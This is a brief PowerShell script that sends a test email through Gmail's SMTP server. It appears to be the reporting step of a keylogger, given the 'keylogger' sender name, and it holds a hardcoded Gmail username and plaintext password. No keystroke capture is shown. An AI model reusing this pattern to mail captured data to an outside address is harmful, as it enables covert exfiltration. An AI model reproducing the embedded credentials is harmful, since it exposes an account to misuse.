$EmailFrom = "keylogger <roboticslabkeylogger@gmail.com>"
$EmailTo = "sakthinaveen251993@gmail.com" 
$Subject = "hello, world!" 
$Body = "Test mail from powershell" 
$SMTPServer = "smtp.gmail.com" 
$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587) 
$SMTPClient.EnableSsl = $true 
$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("roboticslabkeylogger", "roboticslabkeylogger123"); 
$SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)

